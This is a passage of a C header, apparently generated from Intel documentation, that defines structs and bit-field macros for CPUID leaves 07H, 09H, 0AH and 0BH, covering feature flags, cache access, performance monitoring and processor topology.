 * When CPUID executes with EAX set to 07H and ECX = 0, the processor returns information about the
 * maximum input value for sub-leaves that contain extended feature flags. When CPUID executes with
 * EAX set to 07H and the input value of ECX is invalid (see leaf 07H entry in Table 3-8), the
 * processor returns 0 in EAX/EBX/ECX/EDX. In subleaf 0, EAX returns the maximum input value of the
 * highest leaf 7 sub-leaf, and EBX, ECX & EDX contain information of extended feature flags.
 */
#define CPUID_STRUCTURED_EXTENDED_FEATURE_FLAGS 0x00000007
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Reports the maximum input value for supported leaf 7 sub-leaves.
       */
      UINT32 NumberOfSubLeaves : 32;
#define CPUID_EAX_NUMBER_OF_SUB_LEAVES_BIT 0
#define CPUID_EAX_NUMBER_OF_SUB_LEAVES_FLAG 0xFFFFFFFF
#define CPUID_EAX_NUMBER_OF_SUB_LEAVES_MASK 0xFFFFFFFF
#define CPUID_EAX_NUMBER_OF_SUB_LEAVES(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bit 0] Supports RDFSBASE/RDGSBASE/WRFSBASE/WRGSBASE if 1.
       */
      UINT32 Fsgsbase : 1;
#define CPUID_EBX_FSGSBASE_BIT 0
#define CPUID_EBX_FSGSBASE_FLAG 0x01
#define CPUID_EBX_FSGSBASE_MASK 0x01
#define CPUID_EBX_FSGSBASE(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] IA32_TSC_ADJUST MSR is supported if 1.
       */
      UINT32 Ia32TscAdjustMsr : 1;
#define CPUID_EBX_IA32_TSC_ADJUST_MSR_BIT 1
#define CPUID_EBX_IA32_TSC_ADJUST_MSR_FLAG 0x02
#define CPUID_EBX_IA32_TSC_ADJUST_MSR_MASK 0x01
#define CPUID_EBX_IA32_TSC_ADJUST_MSR(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] Supports Intel(R) Software Guard Extensions (Intel(R) SGX Extensions) if 1.
       */
      UINT32 Sgx : 1;
#define CPUID_EBX_SGX_BIT 2
#define CPUID_EBX_SGX_FLAG 0x04
#define CPUID_EBX_SGX_MASK 0x01
#define CPUID_EBX_SGX(_) (((_) >> 2) & 0x01)

      /**
       * [Bit 3] BMI1.
       */
      UINT32 Bmi1 : 1;
#define CPUID_EBX_BMI1_BIT 3
#define CPUID_EBX_BMI1_FLAG 0x08
#define CPUID_EBX_BMI1_MASK 0x01
#define CPUID_EBX_BMI1(_) (((_) >> 3) & 0x01)

      /**
       * [Bit 4] HLE.
       */
      UINT32 Hle : 1;
#define CPUID_EBX_HLE_BIT 4
#define CPUID_EBX_HLE_FLAG 0x10
#define CPUID_EBX_HLE_MASK 0x01
#define CPUID_EBX_HLE(_) (((_) >> 4) & 0x01)

      /**
       * [Bit 5] AVX2.
       */
      UINT32 Avx2 : 1;
#define CPUID_EBX_AVX2_BIT 5
#define CPUID_EBX_AVX2_FLAG 0x20
#define CPUID_EBX_AVX2_MASK 0x01
#define CPUID_EBX_AVX2(_) (((_) >> 5) & 0x01)

      /**
       * [Bit 6] x87 FPU Data Pointer updated only on x87 exceptions if 1.
       */
      UINT32 FdpExcptnOnly : 1;
#define CPUID_EBX_FDP_EXCPTN_ONLY_BIT 6
#define CPUID_EBX_FDP_EXCPTN_ONLY_FLAG 0x40
#define CPUID_EBX_FDP_EXCPTN_ONLY_MASK 0x01
#define CPUID_EBX_FDP_EXCPTN_ONLY(_) (((_) >> 6) & 0x01)

      /**
       * [Bit 7] Supports Supervisor-Mode Execution Prevention if 1.
       */
      UINT32 Smep : 1;
#define CPUID_EBX_SMEP_BIT 7
#define CPUID_EBX_SMEP_FLAG 0x80
#define CPUID_EBX_SMEP_MASK 0x01
#define CPUID_EBX_SMEP(_) (((_) >> 7) & 0x01)

      /**
       * [Bit 8] BMI2.
       */
      UINT32 Bmi2 : 1;
#define CPUID_EBX_BMI2_BIT 8
#define CPUID_EBX_BMI2_FLAG 0x100
#define CPUID_EBX_BMI2_MASK 0x01
#define CPUID_EBX_BMI2(_) (((_) >> 8) & 0x01)

      /**
       * [Bit 9] Supports Enhanced REP MOVSB/STOSB if 1.
       */
      UINT32 EnhancedRepMovsbStosb : 1;
#define CPUID_EBX_ENHANCED_REP_MOVSB_STOSB_BIT 9
#define CPUID_EBX_ENHANCED_REP_MOVSB_STOSB_FLAG 0x200
#define CPUID_EBX_ENHANCED_REP_MOVSB_STOSB_MASK 0x01
#define CPUID_EBX_ENHANCED_REP_MOVSB_STOSB(_) (((_) >> 9) & 0x01)

      /**
       * [Bit 10] If 1, supports INVPCID instruction for system software that manages
       * process-context identifiers.
       */
      UINT32 Invpcid : 1;
#define CPUID_EBX_INVPCID_BIT 10
#define CPUID_EBX_INVPCID_FLAG 0x400
#define CPUID_EBX_INVPCID_MASK 0x01
#define CPUID_EBX_INVPCID(_) (((_) >> 10) & 0x01)

      /**
       * [Bit 11] RTM.
       */
      UINT32 Rtm : 1;
#define CPUID_EBX_RTM_BIT 11
#define CPUID_EBX_RTM_FLAG 0x800
#define CPUID_EBX_RTM_MASK 0x01
#define CPUID_EBX_RTM(_) (((_) >> 11) & 0x01)

      /**
       * [Bit 12] Supports Intel(R) Resource Director Technology (Intel(R) RDT) Monitoring
       * capability if 1.
       */
      UINT32 RdtM : 1;
#define CPUID_EBX_RDT_M_BIT 12
#define CPUID_EBX_RDT_M_FLAG 0x1000
#define CPUID_EBX_RDT_M_MASK 0x01
#define CPUID_EBX_RDT_M(_) (((_) >> 12) & 0x01)

      /**
       * [Bit 13] Deprecates FPU CS and FPU DS values if 1.
       */
      UINT32 Deprecates : 1;
#define CPUID_EBX_DEPRECATES_BIT 13
#define CPUID_EBX_DEPRECATES_FLAG 0x2000
#define CPUID_EBX_DEPRECATES_MASK 0x01
#define CPUID_EBX_DEPRECATES(_) (((_) >> 13) & 0x01)

      /**
       * [Bit 14] Supports Intel(R) Memory Protection Extensions if 1.
       */
      UINT32 Mpx : 1;
#define CPUID_EBX_MPX_BIT 14
#define CPUID_EBX_MPX_FLAG 0x4000
#define CPUID_EBX_MPX_MASK 0x01
#define CPUID_EBX_MPX(_) (((_) >> 14) & 0x01)

      /**
       * [Bit 15] Supports Intel(R) Resource Director Technology (Intel(R) RDT) Allocation
       * capability if 1.
       */
      UINT32 Rdt : 1;
#define CPUID_EBX_RDT_BIT 15
#define CPUID_EBX_RDT_FLAG 0x8000
#define CPUID_EBX_RDT_MASK 0x01
#define CPUID_EBX_RDT(_) (((_) >> 15) & 0x01)

      /**
       * [Bit 16] AVX512F.
       */
      UINT32 Avx512F : 1;
#define CPUID_EBX_AVX512F_BIT 16
#define CPUID_EBX_AVX512F_FLAG 0x10000
#define CPUID_EBX_AVX512F_MASK 0x01
#define CPUID_EBX_AVX512F(_) (((_) >> 16) & 0x01)

      /**
       * [Bit 17] AVX512DQ.
       */
      UINT32 Avx512Dq : 1;
#define CPUID_EBX_AVX512DQ_BIT 17
#define CPUID_EBX_AVX512DQ_FLAG 0x20000
#define CPUID_EBX_AVX512DQ_MASK 0x01
#define CPUID_EBX_AVX512DQ(_) (((_) >> 17) & 0x01)

      /**
       * [Bit 18] RDSEED.
       */
      UINT32 Rdseed : 1;
#define CPUID_EBX_RDSEED_BIT 18
#define CPUID_EBX_RDSEED_FLAG 0x40000
#define CPUID_EBX_RDSEED_MASK 0x01
#define CPUID_EBX_RDSEED(_) (((_) >> 18) & 0x01)

      /**
       * [Bit 19] ADX.
       */
      UINT32 Adx : 1;
#define CPUID_EBX_ADX_BIT 19
#define CPUID_EBX_ADX_FLAG 0x80000
#define CPUID_EBX_ADX_MASK 0x01
#define CPUID_EBX_ADX(_) (((_) >> 19) & 0x01)

      /**
       * [Bit 20] Supports Supervisor-Mode Access Prevention (and the CLAC/STAC instructions) if 1.
       */
      UINT32 Smap : 1;
#define CPUID_EBX_SMAP_BIT 20
#define CPUID_EBX_SMAP_FLAG 0x100000
#define CPUID_EBX_SMAP_MASK 0x01
#define CPUID_EBX_SMAP(_) (((_) >> 20) & 0x01)

      /**
       * [Bit 21] AVX512_IFMA.
       */
      UINT32 Avx512Ifma : 1;
#define CPUID_EBX_AVX512_IFMA_BIT 21
#define CPUID_EBX_AVX512_IFMA_FLAG 0x200000
#define CPUID_EBX_AVX512_IFMA_MASK 0x01
#define CPUID_EBX_AVX512_IFMA(_) (((_) >> 21) & 0x01)
      UINT32 Reserved1 : 1;

      /**
       * [Bit 23] CLFLUSHOPT.
       */
      UINT32 Clflushopt : 1;
#define CPUID_EBX_CLFLUSHOPT_BIT 23
#define CPUID_EBX_CLFLUSHOPT_FLAG 0x800000
#define CPUID_EBX_CLFLUSHOPT_MASK 0x01
#define CPUID_EBX_CLFLUSHOPT(_) (((_) >> 23) & 0x01)

      /**
       * [Bit 24] CLWB.
       */
      UINT32 Clwb : 1;
#define CPUID_EBX_CLWB_BIT 24
#define CPUID_EBX_CLWB_FLAG 0x1000000
#define CPUID_EBX_CLWB_MASK 0x01
#define CPUID_EBX_CLWB(_) (((_) >> 24) & 0x01)

      /**
       * [Bit 25] Intel Processor Trace.
       */
      UINT32 Intel : 1;
#define CPUID_EBX_INTEL_BIT 25
#define CPUID_EBX_INTEL_FLAG 0x2000000
#define CPUID_EBX_INTEL_MASK 0x01
#define CPUID_EBX_INTEL(_) (((_) >> 25) & 0x01)

      /**
       * [Bit 26] (Intel(R) Xeon Phi(TM) only).
       */
      UINT32 Avx512Pf : 1;
#define CPUID_EBX_AVX512PF_BIT 26
#define CPUID_EBX_AVX512PF_FLAG 0x4000000
#define CPUID_EBX_AVX512PF_MASK 0x01
#define CPUID_EBX_AVX512PF(_) (((_) >> 26) & 0x01)

      /**
       * [Bit 27] (Intel(R) Xeon Phi(TM) only).
       */
      UINT32 Avx512Er : 1;
#define CPUID_EBX_AVX512ER_BIT 27
#define CPUID_EBX_AVX512ER_FLAG 0x8000000
#define CPUID_EBX_AVX512ER_MASK 0x01
#define CPUID_EBX_AVX512ER(_) (((_) >> 27) & 0x01)

      /**
       * [Bit 28] AVX512CD.
       */
      UINT32 Avx512Cd : 1;
#define CPUID_EBX_AVX512CD_BIT 28
#define CPUID_EBX_AVX512CD_FLAG 0x10000000
#define CPUID_EBX_AVX512CD_MASK 0x01
#define CPUID_EBX_AVX512CD(_) (((_) >> 28) & 0x01)

      /**
       * [Bit 29] Supports Intel(R) Secure Hash Algorithm Extensions (Intel(R) SHA Extensions) if 1.
       */
      UINT32 Sha : 1;
#define CPUID_EBX_SHA_BIT 29
#define CPUID_EBX_SHA_FLAG 0x20000000
#define CPUID_EBX_SHA_MASK 0x01
#define CPUID_EBX_SHA(_) (((_) >> 29) & 0x01)

      /**
       * [Bit 30] AVX512BW.
       */
      UINT32 Avx512Bw : 1;
#define CPUID_EBX_AVX512BW_BIT 30
#define CPUID_EBX_AVX512BW_FLAG 0x40000000
#define CPUID_EBX_AVX512BW_MASK 0x01
#define CPUID_EBX_AVX512BW(_) (((_) >> 30) & 0x01)

      /**
       * [Bit 31] AVX512VL.
       */
      UINT32 Avx512Vl : 1;
#define CPUID_EBX_AVX512VL_BIT 31
#define CPUID_EBX_AVX512VL_FLAG 0x80000000
#define CPUID_EBX_AVX512VL_MASK 0x01
#define CPUID_EBX_AVX512VL(_) (((_) >> 31) & 0x01)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bit 0] (Intel(R) Xeon Phi(TM) only).
       */
      UINT32 Prefetchwt1 : 1;
#define CPUID_ECX_PREFETCHWT1_BIT 0
#define CPUID_ECX_PREFETCHWT1_FLAG 0x01
#define CPUID_ECX_PREFETCHWT1_MASK 0x01
#define CPUID_ECX_PREFETCHWT1(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] AVX512_VBMI.
       */
      UINT32 Avx512Vbmi : 1;
#define CPUID_ECX_AVX512_VBMI_BIT 1
#define CPUID_ECX_AVX512_VBMI_FLAG 0x02
#define CPUID_ECX_AVX512_VBMI_MASK 0x01
#define CPUID_ECX_AVX512_VBMI(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] Supports user-mode instruction prevention if 1.
       */
      UINT32 Umip : 1;
#define CPUID_ECX_UMIP_BIT 2
#define CPUID_ECX_UMIP_FLAG 0x04
#define CPUID_ECX_UMIP_MASK 0x01
#define CPUID_ECX_UMIP(_) (((_) >> 2) & 0x01)

      /**
       * [Bit 3] Supports protection keys for user-mode pages if 1.
       */
      UINT32 Pku : 1;
#define CPUID_ECX_PKU_BIT 3
#define CPUID_ECX_PKU_FLAG 0x08
#define CPUID_ECX_PKU_MASK 0x01
#define CPUID_ECX_PKU(_) (((_) >> 3) & 0x01)

      /**
       * [Bit 4] If 1, OS has set CR4.PKE to enable protection keys (and the RDPKRU/WRPKRU
       * instructions).
       */
      UINT32 Ospke : 1;
#define CPUID_ECX_OSPKE_BIT 4
#define CPUID_ECX_OSPKE_FLAG 0x10
#define CPUID_ECX_OSPKE_MASK 0x01
#define CPUID_ECX_OSPKE(_) (((_) >> 4) & 0x01)
      UINT32 Reserved1 : 12;

      /**
       * [Bits 21:17] The value of MAWAU used by the BNDLDX and BNDSTX instructions in 64-bit mode.
       */
      UINT32 Mawau : 5;
#define CPUID_ECX_MAWAU_BIT 17
#define CPUID_ECX_MAWAU_FLAG 0x3E0000
#define CPUID_ECX_MAWAU_MASK 0x1F
#define CPUID_ECX_MAWAU(_) (((_) >> 17) & 0x1F)

      /**
       * [Bit 22] RDPID and IA32_TSC_AUX are available if 1.
       */
      UINT32 Rdpid : 1;
#define CPUID_ECX_RDPID_BIT 22
#define CPUID_ECX_RDPID_FLAG 0x400000
#define CPUID_ECX_RDPID_MASK 0x01
#define CPUID_ECX_RDPID(_) (((_) >> 22) & 0x01)
      UINT32 Reserved2 : 7;

      /**
       * [Bit 30] Supports SGX Launch Configuration if 1.
       */
      UINT32 SgxLc : 1;
#define CPUID_ECX_SGX_LC_BIT 30
#define CPUID_ECX_SGX_LC_FLAG 0x40000000
#define CPUID_ECX_SGX_LC_MASK 0x01
#define CPUID_ECX_SGX_LC(_) (((_) >> 30) & 0x01)
      UINT32 Reserved3 : 1;
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_07;

/**
 * @brief Direct Cache Access Information Leaf
 *
 * When CPUID executes with EAX set to 09H, the processor returns information about Direct Cache
 * Access capabilities.
 */
#define CPUID_DIRECT_CACHE_ACCESS_INFORMATION 0x00000009
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Value of bits [31:0] of IA32_PLATFORM_DCA_CAP MSR (address 1F8H).
       */
      UINT32 Ia32PlatformDcaCap : 32;
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_BIT 0
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_FLAG 0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_MASK 0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] EBX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT 0
#define CPUID_EBX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EBX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] ECX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT 0
#define CPUID_ECX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_ECX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_09;

/**
 * @brief Architectural Performance Monitoring Leaf
 *
 * When CPUID executes with EAX set to 0AH, the processor returns information about support for
 * architectural performance monitoring capabilities. Architectural performance monitoring is
 * supported if the version ID is greater than Pn 0. For each version of architectural performance
 * monitoring capability, software must enumerate this leaf to discover the programming facilities
 * and the architectural performance events available in the processor.
 *
 * @see Vol3C[23(Introduction to Virtual-Machine Extensions)]
 */
#define CPUID_ARCHITECTURAL_PERFORMANCE_MONITORING 0x0000000A
typedef struct {
  union {
    struct {
      /**
       * [Bits 7:0] Version ID of architectural performance monitoring.
       */
      UINT32 VersionIdOfArchitecturalPerformanceMonitoring : 8;
#define CPUID_EAX_VERSION_ID_OF_ARCHITECTURAL_PERFORMANCE_MONITORING_BIT 0
#define CPUID_EAX_VERSION_ID_OF_ARCHITECTURAL_PERFORMANCE_MONITORING_FLAG 0xFF
#define CPUID_EAX_VERSION_ID_OF_ARCHITECTURAL_PERFORMANCE_MONITORING_MASK 0xFF
#define CPUID_EAX_VERSION_ID_OF_ARCHITECTURAL_PERFORMANCE_MONITORING(_) (((_) >> 0) & 0xFF)

      /**
       * [Bits 15:8] Number of general-purpose performance monitoring counter per logical processor.
       */
      UINT32 NumberOfPerformanceMonitoringCounterPerLogicalProcessor : 8;
#define CPUID_EAX_NUMBER_OF_PERFORMANCE_MONITORING_COUNTER_PER_LOGICAL_PROCESSOR_BIT 8
#define CPUID_EAX_NUMBER_OF_PERFORMANCE_MONITORING_COUNTER_PER_LOGICAL_PROCESSOR_FLAG 0xFF00
#define CPUID_EAX_NUMBER_OF_PERFORMANCE_MONITORING_COUNTER_PER_LOGICAL_PROCESSOR_MASK 0xFF
#define CPUID_EAX_NUMBER_OF_PERFORMANCE_MONITORING_COUNTER_PER_LOGICAL_PROCESSOR(_) \
  (((_) >> 8) & 0xFF)

      /**
       * [Bits 23:16] Bit width of general-purpose, performance monitoring counter.
       */
      UINT32 BitWidthOfPerformanceMonitoringCounter : 8;
#define CPUID_EAX_BIT_WIDTH_OF_PERFORMANCE_MONITORING_COUNTER_BIT 16
#define CPUID_EAX_BIT_WIDTH_OF_PERFORMANCE_MONITORING_COUNTER_FLAG 0xFF0000
#define CPUID_EAX_BIT_WIDTH_OF_PERFORMANCE_MONITORING_COUNTER_MASK 0xFF
#define CPUID_EAX_BIT_WIDTH_OF_PERFORMANCE_MONITORING_COUNTER(_) (((_) >> 16) & 0xFF)

      /**
       * [Bits 31:24] Length of EBX bit vector to enumerate architectural performance monitoring
       * events.
       */
      UINT32 EbxBitVectorLength : 8;
#define CPUID_EAX_EBX_BIT_VECTOR_LENGTH_BIT 24
#define CPUID_EAX_EBX_BIT_VECTOR_LENGTH_FLAG 0xFF000000
#define CPUID_EAX_EBX_BIT_VECTOR_LENGTH_MASK 0xFF
#define CPUID_EAX_EBX_BIT_VECTOR_LENGTH(_) (((_) >> 24) & 0xFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bit 0] Core cycle event not available if 1.
       */
      UINT32 CoreCycleEventNotAvailable : 1;
#define CPUID_EBX_CORE_CYCLE_EVENT_NOT_AVAILABLE_BIT 0
#define CPUID_EBX_CORE_CYCLE_EVENT_NOT_AVAILABLE_FLAG 0x01
#define CPUID_EBX_CORE_CYCLE_EVENT_NOT_AVAILABLE_MASK 0x01
#define CPUID_EBX_CORE_CYCLE_EVENT_NOT_AVAILABLE(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] Instruction retired event not available if 1.
       */
      UINT32 InstructionRetiredEventNotAvailable : 1;
#define CPUID_EBX_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_BIT 1
#define CPUID_EBX_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_FLAG 0x02
#define CPUID_EBX_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_MASK 0x01
#define CPUID_EBX_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] Reference cycles event not available if 1.
       */
      UINT32 ReferenceCyclesEventNotAvailable : 1;
#define CPUID_EBX_REFERENCE_CYCLES_EVENT_NOT_AVAILABLE_BIT 2
#define CPUID_EBX_REFERENCE_CYCLES_EVENT_NOT_AVAILABLE_FLAG 0x04
#define CPUID_EBX_REFERENCE_CYCLES_EVENT_NOT_AVAILABLE_MASK 0x01
#define CPUID_EBX_REFERENCE_CYCLES_EVENT_NOT_AVAILABLE(_) (((_) >> 2) & 0x01)

      /**
       * [Bit 3] Last-level cache reference event not available if 1.
       */
      UINT32 LastLevelCacheReferenceEventNotAvailable : 1;
#define CPUID_EBX_LAST_LEVEL_CACHE_REFERENCE_EVENT_NOT_AVAILABLE_BIT 3
#define CPUID_EBX_LAST_LEVEL_CACHE_REFERENCE_EVENT_NOT_AVAILABLE_FLAG 0x08
#define CPUID_EBX_LAST_LEVEL_CACHE_REFERENCE_EVENT_NOT_AVAILABLE_MASK 0x01
#define CPUID_EBX_LAST_LEVEL_CACHE_REFERENCE_EVENT_NOT_AVAILABLE(_) (((_) >> 3) & 0x01)

      /**
       * [Bit 4] Last-level cache misses event not available if 1.
       */
      UINT32 LastLevelCacheMissesEventNotAvailable : 1;
#define CPUID_EBX_LAST_LEVEL_CACHE_MISSES_EVENT_NOT_AVAILABLE_BIT 4
#define CPUID_EBX_LAST_LEVEL_CACHE_MISSES_EVENT_NOT_AVAILABLE_FLAG 0x10
#define CPUID_EBX_LAST_LEVEL_CACHE_MISSES_EVENT_NOT_AVAILABLE_MASK 0x01
#define CPUID_EBX_LAST_LEVEL_CACHE_MISSES_EVENT_NOT_AVAILABLE(_) (((_) >> 4) & 0x01)

      /**
       * [Bit 5] Branch instruction retired event not available if 1.
       */
      UINT32 BranchInstructionRetiredEventNotAvailable : 1;
#define CPUID_EBX_BRANCH_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_BIT 5
#define CPUID_EBX_BRANCH_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_FLAG 0x20
#define CPUID_EBX_BRANCH_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_MASK 0x01
#define CPUID_EBX_BRANCH_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE(_) (((_) >> 5) & 0x01)

      /**
       * [Bit 6] Branch mispredict retired event not available if 1.
       */
      UINT32 BranchMispredictRetiredEventNotAvailable : 1;
#define CPUID_EBX_BRANCH_MISPREDICT_RETIRED_EVENT_NOT_AVAILABLE_BIT 6
#define CPUID_EBX_BRANCH_MISPREDICT_RETIRED_EVENT_NOT_AVAILABLE_FLAG 0x40
#define CPUID_EBX_BRANCH_MISPREDICT_RETIRED_EVENT_NOT_AVAILABLE_MASK 0x01
#define CPUID_EBX_BRANCH_MISPREDICT_RETIRED_EVENT_NOT_AVAILABLE(_) (((_) >> 6) & 0x01)
      UINT32 Reserved1 : 25;
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] ECX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT 0
#define CPUID_ECX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_ECX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 4:0] Number of fixed-function performance counters (if Version ID > 1).
       */
      UINT32 NumberOfFixedFunctionPerformanceCounters : 5;
#define CPUID_EDX_NUMBER_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_BIT 0
#define CPUID_EDX_NUMBER_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_FLAG 0x1F
#define CPUID_EDX_NUMBER_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_MASK 0x1F
#define CPUID_EDX_NUMBER_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS(_) (((_) >> 0) & 0x1F)

      /**
       * [Bits 12:5] Bit width of fixed-function performance counters (if Version ID > 1).
       */
      UINT32 BitWidthOfFixedFunctionPerformanceCounters : 8;
#define CPUID_EDX_BIT_WIDTH_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_BIT 5
#define CPUID_EDX_BIT_WIDTH_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_FLAG 0x1FE0
#define CPUID_EDX_BIT_WIDTH_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_MASK 0xFF
#define CPUID_EDX_BIT_WIDTH_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS(_) (((_) >> 5) & 0xFF)
      UINT32 Reserved1 : 2;

      /**
       * [Bit 15] AnyThread deprecation.
       */
      UINT32 AnyThreadDeprecation : 1;
#define CPUID_EDX_ANY_THREAD_DEPRECATION_BIT 15
#define CPUID_EDX_ANY_THREAD_DEPRECATION_FLAG 0x8000
#define CPUID_EDX_ANY_THREAD_DEPRECATION_MASK 0x01
#define CPUID_EDX_ANY_THREAD_DEPRECATION(_) (((_) >> 15) & 0x01)
      UINT32 Reserved2 : 16;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_0A;

/**
 * @brief Extended Topology Enumeration Leaf
 *
 * When CPUID executes with EAX set to 0BH, the processor returns information about extended
 * topology enumeration data. Software must detect the presence of CPUID leaf 0BH by verifying
 * - the highest leaf index supported by CPUID is >= 0BH, and
 * - CPUID.0BH:EBX[15:0] reports a non-zero value.
 *
 * @note Most of Leaf 0BH output depends on the initial value in ECX. The EDX output of leaf 0BH is
 * always valid and does not vary with input value in ECX. Output value in ECX[7:0] always equals
 * input value in ECX[7:0]. Sub-leaf index 0 enumerates SMT level. Each subsequent higher sub-leaf
 * index enumerates a higherlevel topological entity in hierarchical order. For sub-leaves that
 * return an invalid level-type of 0 in ECX[15:8]; EAX and EBX will return 0. If an input value n in
 * ECX returns the invalid level-type of 0 in ECX[15:8], other input values with ECX > n also return
 * 0 in ECX[15:8].
 */
#define CPUID_EXTENDED_TOPOLOGY 0x0000000B
typedef struct {
  union {
    struct {
      /**
       * [Bits 4:0] Number of bits to shift right on x2APIC ID to get a unique topology ID of the
       * next level type. All logical processors with the same next level ID share current level.
       *
       * @note Software should use this field (EAX[4:0]) to enumerate processor topology of the
       * system.
       */
      UINT32 X2ApicIdToUniqueTopologyIdShift : 5;
#define CPUID_EAX_X2APIC_ID_TO_UNIQUE_TOPOLOGY_ID_SHIFT_BIT 0
#define CPUID_EAX_X2APIC_ID_TO_UNIQUE_TOPOLOGY_ID_SHIFT_FLAG 0x1F
#define CPUID_EAX_X2APIC_ID_TO_UNIQUE_TOPOLOGY_ID_SHIFT_MASK 0x1F
#define CPUID_EAX_X2APIC_ID_TO_UNIQUE_TOPOLOGY_ID_SHIFT(_) (((_) >> 0) & 0x1F)
      UINT32 Reserved1 : 27;
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 15:0] Number of logical processors at this level type. The number reflects
       * configuration as shipped by Intel.
       *
       * @note Software must not use EBX[15:0] to enumerate processor topology of the system. This
       * value in this field (EBX[15:0]) is only intended for display/diagnostic purposes. The
       * actual number of logical processors available to BIOS/OS/Applications may be different from
       * the value of EBX[15:0], depending on software and platform hardware configurations.
       */
      UINT32 NumberOfLogicalProcessorsAtThisLevelType : 16;
#define CPUID_EBX_NUMBER_OF_LOGICAL_PROCESSORS_AT_THIS_LEVEL_TYPE_BIT 0
#define CPUID_EBX_NUMBER_OF_LOGICAL_PROCESSORS_AT_THIS_LEVEL_TYPE_FLAG 0xFFFF
#define CPUID_EBX_NUMBER_OF_LOGICAL_PROCESSORS_AT_THIS_LEVEL_TYPE_MASK 0xFFFF
#define CPUID_EBX_NUMBER_OF_LOGICAL_PROCESSORS_AT_THIS_LEVEL_TYPE(_) (((_) >> 0) & 0xFFFF)
      UINT32 Reserved1 : 16;
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 7:0] Level number. Same value in ECX input.
       */
      UINT32 LevelNumber : 8;
#define CPUID_ECX_LEVEL_NUMBER_BIT 0
#define CPUID_ECX_LEVEL_NUMBER_FLAG 0xFF
#define CPUID_ECX_LEVEL_NUMBER_MASK 0xFF
#define CPUID_ECX_LEVEL_NUMBER(_) (((_) >> 0) & 0xFF)

      /**
       * [Bits 15:8] Level type.
       *
       * @note The value of the "level type" field is not related to level numbers in any way,
       * higher "level type" values do not mean higher levels. Level type field has the following
       * encoding:
       *       - 0: Invalid.
       *       - 1: SMT.
       *       - 2: Core.
       *       - 3-255: Reserved.
       */
      UINT32 LevelType : 8;
#define CPUID_ECX_LEVEL_TYPE_BIT 8
#define CPUID_ECX_LEVEL_TYPE_FLAG 0xFF00
#define CPUID_ECX_LEVEL_TYPE_MASK 0xFF
#define CPUID_ECX_LEVEL_TYPE(_) (((_) >> 8) & 0xFF)
      UINT32 Reserved1 : 16;
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] x2APIC ID the current logical processor.
       */
      UINT32 X2ApicId : 32;
